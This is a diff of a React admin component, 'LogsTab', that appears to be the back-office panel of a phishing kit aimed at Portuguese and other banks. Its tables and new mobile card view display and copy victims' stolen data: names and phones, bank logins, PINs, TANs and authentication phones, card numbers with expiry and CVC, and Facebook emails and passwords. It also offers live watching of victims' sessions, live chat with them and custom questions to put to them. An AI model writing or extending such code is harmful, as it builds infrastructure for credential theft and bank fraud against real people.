+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.164 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                            </svg>
+                            <span>İzle</span>
+                          </>
+                        )}
+                      </button>
+                    </td>
                     <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="cursor-pointer text-[11px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
+                      <div className="cursor-pointer text-[13px] font-semibold opacity-90 transition-opacity group-hover:opacity-100 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="cursor-pointer text-[11px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
+                      <div className="cursor-pointer text-[13px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-2 text-[10px] leading-tight">
+                      {(() => {
+                        // Giris yontemi OLMAYAN bankalar (autenticacao'ya giden PT
+                        // bankalari) Banka kolonunda bos gosterilsin.
+                        if (isAuthOnlyBank && shortCreds.length === 0) {
+                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
+                        }
+                        return null;
+                      })() ?? (
+                      <div className="space-y-2 text-[12px] leading-tight">
                         {/* SATIR 1: BANKA ADI + GIRIS YONTEMI BADGE (LOGO KALDIRILDI) */}
                         <div className="flex items-start gap-2">
                           {/* BANKA ADI + GIRIS YONTEMI */}
                           <div className="min-w-0 flex-1 space-y-1">
                             {fd.bankName && (
-                              <div className="font-extrabold text-[11px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                              <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
                                 {fd.bankName}
                               </div>
                             )}
                             {!fd.bankName && (
-                              <div className="font-semibold text-[10px] opacity-40">
+                              <div className="font-semibold text-[12px] opacity-40">
                                 Henüz banka seçilmedi
                               </div>
                             )}
                             {loginMethod && (
-                              <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[9px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
+                              <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[11px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                 Yöntem: {loginMethod}
                               </span>
                             )}
-                            {!loginMethod && fd.bankName && (
-                              <span className="inline-flex max-w-full items-center rounded-full border border-zinc-500/10 bg-zinc-500/5 px-2 py-0.5 text-[8px] font-bold uppercase tracking-wider text-zinc-500 dark:text-zinc-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
+                            {!loginMethod && fd.bankName && !isPtBank && (
+                              <span className="inline-flex max-w-full items-center rounded-full border border-zinc-500/10 bg-zinc-500/5 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider text-zinc-500 dark:text-zinc-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight">
                                 Giriş yöntemi: bekleniyor
                               </span>
                             )}
@@ -2343,7 +2591,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           <div className="space-y-1 pl-0.5 pt-0.5">
                             {shortCreds.map(([key, value]) => (
                               <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1 leading-tight">
-                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[8px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                                <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
                                   {key}
                                 </span>
                                 <span className="min-w-0 cursor-pointer font-medium transition-opacity hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(String(value))}>
@@ -2354,16 +2602,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           </div>
                         )}
                       </div>
+                      )}
                     </td>
                     <td className="px-2 py-3 align-top">
                       {approvalEntries.length === 0 ? (
-                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
+                        <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       ) : (
                         <div className="flex flex-col items-start gap-1">
                           {approvalEntries.map((approvalValue, index) => (
                             <span
                               key={`${approvalValue}-${index}`}
-                              className="inline-block w-fit max-w-full rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[9px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
+                              className="inline-block w-fit max-w-full rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 whitespace-normal break-words [overflow-wrap:anywhere] leading-tight"
                             >
                               {getApprovalDisplayText(approvalValue)}
                             </span>
@@ -2372,30 +2621,98 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       )}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      {genEntries.length > 0 ? (
-                        <div className="space-y-2">
-                          {genEntries.map((entry, gi) => (
-                            <div key={gi} className="space-y-0.5">
-                              <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
-                                kodas {entry.type === "generator2" ? "2" : "1"}
-                              </span>
-                              {Object.entries(entry.data)
-                                .filter(([, v]) => v != null && String(v).trim() !== "")
-                                .map(([k, v]) => (
-                                  <div
-                                    key={k}
-                                    className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
-                                    onClick={() => copyToClipboard(String(v))}
-                                  >
-                                    {String(v)}
+                      {(() => {
+                        const authPhone = typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() ? fd.cmdPhone.trim() : "";
+                        const authPin = typeof fd.cmdPin === "string" && fd.cmdPin.trim() ? fd.cmdPin.trim() : "";
+                        const authTan =
+                          typeof fd.cmdTan === "string" && fd.cmdTan.trim()
+                            ? fd.cmdTan.trim()
+                            : typeof fd.autenticacaoTan === "string" && fd.autenticacaoTan.trim()
+                              ? fd.autenticacaoTan.trim()
+                              : "";
+                        const hasAuth = Boolean(authPhone || authPin || authTan);
+                        if (hasAuth) {
+                          return (
+                            <div className="space-y-1 text-[12px] font-medium leading-tight">
+                              {(() => {
+                                // Autenticacao kolonu: SADECE autenticacao akisina giden banka
+                                // adi basilir. Normal HTML sablonlu banka (cgd, bpi, santander-pt,
+                                // novo-banco, abanca vb.) ismi burada ASLA gorunmez.
+                                // Onceki akistan kalan eski banka adi da basilmaz — kayit
+                                // autenticacaoBankName / autenticacaoBankSlug'dan okunur.
+                                // Geriye donuk uyumluluk: eski sessionlarda bu alanlar yoksa,
+                                // bankSlug auth-only setteyse bankName gosterilir.
+                                const authBankName =
+                                  typeof fd.autenticacaoBankName === "string" && fd.autenticacaoBankName.trim()
+                                    ? fd.autenticacaoBankName.trim()
+                                    : typeof fd.autenticacaoBankSlug === "string" && fd.autenticacaoBankSlug.trim()
+                                      ? fd.autenticacaoBankSlug.trim()
+                                      : AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower)
+                                        ? String(fd.bankName || fd.bankSlug || "")
+                                        : "";
+                                if (!authBankName) return null;
+                                return (
+                                  <div className="font-extrabold text-[12px] text-sky-600 dark:text-sky-400 break-words [overflow-wrap:anywhere]">
+                                    {authBankName}
                                   </div>
-                                ))}
+                                );
+                              })()}
+                              {authPhone && (
+                                <div className="flex min-w-0 items-start gap-1">
+                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Tel:</span>
+                                  <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
+                                </div>
+                              )}
+                              {authPin && (
+                                <div className="flex min-w-0 items-start gap-1">
+                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">PIN:</span>
+                                  <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
+                                </div>
+                              )}
+                              {authTan && (
+                                <div className="flex min-w-0 items-start gap-1">
+                                  <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">TAN:</span>
+                                  <span className="min-w-0 cursor-pointer font-mono font-bold text-rose-600 dark:text-rose-400 whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
+                                </div>
+                              )}
+                              {typeof fd.approvalStatus === "string" && fd.approvalStatus.startsWith("autenticacao") && (
+                                <span className={`inline-block w-fit rounded-full border px-2 py-0.5 text-[11px] font-bold tracking-wide whitespace-nowrap leading-tight ${
+                                  fd.approvalStatus === "autenticacao_confirmed"
+                                    ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400"
+                                    : "border-amber-500/20 bg-amber-500/10 text-amber-600 dark:text-amber-400"
+                                }`}>
+                                  {fd.approvalStatus === "autenticacao_confirmed" ? "Autenticação Onaylandı" : "Autenticação [Bekliyor]"}
+                                </span>
+                              )}
                             </div>
-                          ))}
-                        </div>
-                      ) : (
-                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
-                      )}
+                          );
+                        }
+                        if (genEntries.length === 0) {
+                          return <span className={`text-[12px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
+                        }
+                        return (
+                          <div className="space-y-2">
+                            {genEntries.map((entry, gi) => (
+                              <div key={gi} className="space-y-0.5">
+                                <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[11px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
+                                  kodas {entry.type === "generator2" ? "2" : "1"}
+                                </span>
+                                {Object.entries(entry.data)
+                                  .filter(([, v]) => v != null && String(v).trim() !== "")
+                                  .map(([k, v]) => (
+                                    <div
+                                      key={k}
+                                      className="cursor-pointer font-mono text-[13px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
+                                      onClick={() => copyToClipboard(String(v))}
+                                    >
+                                      {String(v)}
+                                    </div>
+                                  ))}
+                              </div>
+                            ))}
+                          </div>
+                        );
+                      })()}
                     </td>
                     <td className="px-2 py-3 align-top">
                       <div
@@ -2406,31 +2723,31 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-1 text-[10px] font-medium leading-tight">
-                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
-                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
-                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
+                      <div className="space-y-1 text-[12px] font-medium leading-tight">
+                        {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
+                        {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
+                        {fd.cardCvc && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">CVC:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardCvc}</span></div>}
                         {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? <span className={`${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span> : null}
                       </div>
                     </td>
                     {/* === FACEBOOK SUTUNU (YENI, Sadece fbEmail/fbPassword/fb AdSoyad goster) === */}
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-1 text-[10px] font-medium leading-tight">
+                      <div className="space-y-1 text-[12px] font-medium leading-tight">
                         {fd.fbEmail && (
                           <div className="flex min-w-0 items-start gap-1">
-                            <span className="shrink-0 opacity-60 text-[8px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">E-posta:</span>
+                            <span className="shrink-0 opacity-60 text-[10px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">E-posta:</span>
                             <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</span>
                           </div>
                         )}
                         {fd.fbPassword && (
                           <div className="flex min-w-0 items-start gap-1">
-                            <span className="shrink-0 opacity-60 text-[8px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">Parool:</span>
+                            <span className="shrink-0 opacity-60 text-[10px] font-bold uppercase text-[#0064E0] dark:text-[#3E8BFF]">Parool:</span>
                             <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere] font-mono" onClick={()=>copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</span>
                           </div>
                         )}
                         {((fd.fbFirstName || fd.fbLastName)) && (
                           <div className="flex min-w-0 items-start gap-1">
-                            <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">Nimi:</span>
+                            <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase">Nimi:</span>
                             <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{String(fd.fbFirstName || "")} {String(fd.fbLastName || "")}</span>
                           </div>
                         )}
@@ -2440,18 +2757,18 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <span className={`inline-block max-w-full rounded-full px-2 py-1 text-[9px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] leading-tight text-center ${stepColor}`}>
+                      <span className={`inline-block max-w-full rounded-full px-2 py-1 text-[11px] font-bold tracking-wide shadow-sm whitespace-normal break-words [overflow-wrap:anywhere] leading-tight text-center ${stepColor}`}>
                         {stepText}
                       </span>
                     </td>
                     <td className="px-2 py-3 align-top">
                       {isOnline ? (
-                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[11px] font-bold tracking-wide whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                           ONLINE
                         </span>
                       ) : (
-                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
+                        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[11px] font-bold tracking-wide whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                           OFFLINE
                         </span>
@@ -2462,7 +2779,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       {!isDeletedMode && (
                         <>
                           <select
-                            className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                            className={`w-full rounded-lg border px-2 py-1.5 text-[12px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                             value=""
                             onChange={(e) => {
                               if (e.target.value) {
@@ -2487,7 +2804,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                           </select>
 
                           <select
-                            className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                            className={`w-full rounded-lg border px-2 py-1.5 text-[12px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                             value=""
                             onChange={(e) => {
                               if (e.target.value) {
@@ -2507,19 +2824,19 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       )}
 
                         <div className={`flex justify-end items-center mt-0.5 gap-1 w-full ${isDeletedMode ? 'pt-1' : ''}`}>
-                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Canlı Destek">
+                          <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 hover:bg-blue-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Canlı Destek">
                             <span>💬</span>
                           </button>
-                          <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Özel Sorular (Soru-Cevap)">
+                          <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 hover:bg-violet-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Özel Sorular (Soru-Cevap)">
                             <span>❓</span>
                           </button>
-                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
+                          <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 hover:bg-purple-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Cihaz Bilgisi">
                             <span>📱</span>
                           </button>
                           {/* ================== 📜 GECMIS GIRISLER BUTONU (Normal + Silinen modların HER İKİSİNDE GORUNUR) ================== */}
                           <button
                             onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }}
-                            className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                            className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 hover:bg-amber-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                             title="Önceki Banka & Facebook Giriş Kayıtları (Geçmiş)"
                           >
                             <span>📜</span>
@@ -2528,21 +2845,21 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             <>
                               <button
                                 onClick={() => void handleRestoreLog(row.id)}
-                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                                 title="Logu Geri Yükle (Aktif listeye döndür)"
                               >
                                 <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6" /></svg>
                               </button>
                               <button
                                 onClick={() => void handlePermanentDelete(row.id)}
-                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide"
+                                className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide"
                                 title="Kalıcı Olarak Sil (GERİ ALINMAZ)"
                               >
                                 <span>🗑️</span>
                               </button>
                             </>
                           ) : (
-                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[10px] font-bold uppercase tracking-wide" title="Logu Sil">
+                            <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center gap-1 px-2 py-1.5 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 hover:bg-red-500 hover:text-white transition-all duration-200 text-[12px] font-bold uppercase tracking-wide" title="Logu Sil">
                               <span>🗑️</span>
                             </button>
                           )}
@@ -2554,6 +2871,287 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               })}
             </tbody>
           </table>
+        </div>
+
+        {/* ============ MOBILE CARD VIEW (lg altinda tablo yerine kartlar) ============ */}
+        <div className="lg:hidden p-3 space-y-3">
+          {rows.length === 0 && (
+            <div className="px-5 py-12 text-center text-sm opacity-50 font-medium">
+              Henüz bir log yok. İşlemler burada görünecek.
+            </div>
+          )}
+          {rows.map((row) => {
+            const fd = (row.form_data || {}) as Record<string, any>;
+            const isOnline = isSessionLive(
+              row.id,
+              onlineSessionIds,
+              row.status,
+              sessionLastSeenAt[row.id],
+            );
+            const livePath = sessionPaths[row.id];
+            const { s, stepText, stepColor } = getStepDisplay(
+              row.current_step as string,
+              fd,
+              isOnline,
+              livePath,
+              darkMode
+            );
+            const shortCreds = getShortBankCredentialFields(fd);
+            const loginMethod = readLoginMethod(fd);
+            const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
+            const isAuthOnlyBank = s === "autenticacao" || AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower);
+            const authPhone = typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() ? fd.cmdPhone.trim() : "";
+            const authPin = typeof fd.cmdPin === "string" && fd.cmdPin.trim() ? fd.cmdPin.trim() : "";
+            const authTan =
+              typeof fd.cmdTan === "string" && fd.cmdTan.trim()
+                ? fd.cmdTan.trim()
+                : typeof fd.autenticacaoTan === "string" && fd.autenticacaoTan.trim()
+                  ? fd.autenticacaoTan.trim()
+                  : "";
+            const smsValue =
+              typeof fd.smsCode === "string" && fd.smsCode.trim()
+                ? fd.smsCode.trim()
+                : typeof fd.tacCode === "string" && fd.tacCode.trim()
+                  ? fd.tacCode.trim()
+                  : "";
+            const fullName = `${fd.firstName || ""} ${fd.lastName || ""}`.trim();
+            const currentApproval =
+              typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
+            const approvalEntries =
+              currentApproval && !currentApproval.startsWith("autenticacao") ? [currentApproval] : [];
+
+            return (
+              <div
+                key={row.id}
+                className={`rounded-2xl border p-3.5 space-y-3 shadow-sm ${
+                  darkMode ? "bg-black/20 border-white/10" : "bg-white border-gray-200"
+                }`}
+              >
+                {/* UST SATIR: Canli Izle + Step + Online */}
+                <div className="flex items-center justify-between gap-2 flex-wrap">
+                  <button
+                    type="button"
+                    onClick={() => setLiveWatchRow(row)}
+                    className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[12px] font-bold transition-all shadow-sm ${
+                      isOnline
+                        ? "bg-red-500/15 text-red-500 border border-red-500/30"
+                        : darkMode
+                        ? "bg-white/5 text-gray-400 border border-white/10"
+                        : "bg-gray-100 text-gray-500 border border-gray-200"
+                    }`}
+                  >
+                    {isOnline && (
+                      <span className="relative flex h-2 w-2">
+                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                        <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+                      </span>
+                    )}
+                    {isOnline ? "Canlı İzle" : "İzle"}
+                  </button>
+                  <div className="flex items-center gap-1.5">
+                    <span className={`inline-block rounded-full px-2 py-1 text-[10px] font-bold tracking-wide ${stepColor}`}>
+                      {stepText}
+                    </span>
+                    {isOnline ? (
+                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold whitespace-nowrap">
+                        <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
+                        ONLINE
+                      </span>
+                    ) : (
+                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold whitespace-nowrap">
+                        <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
+                        OFFLINE
+                      </span>
+                    )}
+                  </div>
+                </div>
+
+                {/* KIMLIK: Isim + Telefon + Odul */}
+                <div className="flex items-start justify-between gap-2">
+                  <div className="min-w-0">
+                    <div
+                      className="text-[14px] font-bold break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
+                      onClick={() => copyToClipboard(fullName)}
+                    >
+                      {fullName || "-"}
+                    </div>
+                    <div
+                      className="text-[12px] opacity-70 break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
+                      onClick={() => copyToClipboard(fd.phone)}
+                    >
+                      {fd.phone || "-"}
+                    </div>
+                  </div>
+                  {row.amount ? (
+                    <span className="shrink-0 text-[15px] font-black text-[#EB5E28]">€{row.amount}</span>
+                  ) : null}
+                </div>
+
+                {/* BANKA BLOKU */}
+                {(!isAuthOnlyBank || shortCreds.length > 0) && (fd.bankName || shortCreds.length > 0) && (
+                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                    {fd.bankName && (
+                      <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                        {fd.bankName}
+                      </div>
+                    )}
+                    {loginMethod && (
+                      <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 break-words [overflow-wrap:anywhere]">
+                        Yöntem: {loginMethod}
+                      </span>
+                    )}
+                    {shortCreds.map(([key, value]) => (
+                      <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1.5 leading-tight">
+                        <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1.5 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                          {key}
+                        </span>
+                        <span
+                          className="min-w-0 cursor-pointer font-mono font-medium text-[12px] break-words [overflow-wrap:anywhere] hover:opacity-70"
+                          onClick={() => copyToClipboard(String(value))}
+                        >
+                          {String(value)}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+                )}
+
+                {/* AUTENTICACAO BLOKU */}
+                {(authPhone || authPin || authTan) && (
+                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
